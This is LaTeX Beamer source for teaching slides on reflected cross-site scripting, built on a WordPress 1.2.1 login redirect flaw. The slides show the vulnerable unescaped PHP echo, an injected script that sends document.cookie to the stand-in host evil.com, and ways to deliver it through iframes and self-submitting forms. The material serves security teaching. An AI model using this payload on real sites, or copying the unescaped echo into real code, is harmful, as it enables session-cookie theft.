
\newmintinline{PHP}{startinline}

\begin{frame}[fragile,label=reflectXSS1]{reflected XSS example}
    \begin{itemize}
        \item WordPress version 1.2.1 (blog software)
    \end{itemize}
\begin{minted}[highlightlines=2,fontsize=\fontsize{12}{13}\selectfont]{PHP}
<input type="hidden" name="redirect_to"
       value="<?php echo $_GET["redirect_to"] ?>" />
\end{minted}
    \begin{itemize}
        \item \PHPinline|$_GET["redirect_to"]| --- form input
            \begin{itemize}
            \item intended to be from hidden field or autogenerated link
            \item \texttt{/login.php?redirect\_to=\fbox{foo}}
            \end{itemize}
\begin{framed}\fontsize{12}{13}\selectfont
\texttt{"> <script>(new Image()).src=\\
'http://evil.com/'+document.cookie;</script>}
\end{framed}
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=reflectXSSExploit]{exploiting reflected XSS (1)}
    \begin{itemize}
    \item how does attacker get \myemph{target user to make evil request}
        \begin{framed}\small\tt
            http://example.com/?redirect\_to="><script>(new\\
            Image()).src='http://evil.com'+document.cookie;<script>
        \end{framed}
    \item<2-> just put link/form on any web page, hope user clicks it?
    \end{itemize}
\end{frame}

    \begin{frame}[fragile,label=reflectXSSExploit2]{exploiting reflected XSS (2)}
\begin{itemize}
    \item iframes:
\begin{minted}[fontsize=\small,breakafter==,breaklines,bgcolor=bg]{HTML}
<iframe src="https://example.com/?redirect_to= %22%3E%3Cscript%3Enew+Image...">
</iframe>
\end{minted}
        \vspace{-.5cm}
        \begin{itemize}
        \item iframe: embed another webpage on webpage
        \item example: office hour calendar on our course webpage
        \end{itemize}
    \item JS can ``click'' links/forms
        \vspace{-.5cm}
\begin{minted}[fontsize=\small,breakafter==,breaklines,bgcolor=bg]{HTML}
<form action="https://example.com/">...</form>
<script>document.forms[0].submit()</script>
\end{minted}
    \end{itemize}
\end{frame}

\begin{frame}{aside embedded content}
    \begin{itemize}
    \item it's \myemph{everywhere}
    \item advertisements --- often loaded from other site
    \item embedded Twitter widget, Youtube videos, etc.
    \item newspaper might use externally hosted comments
    \item JavaScript libraries hosted elsewhere
    \end{itemize}
\end{frame}

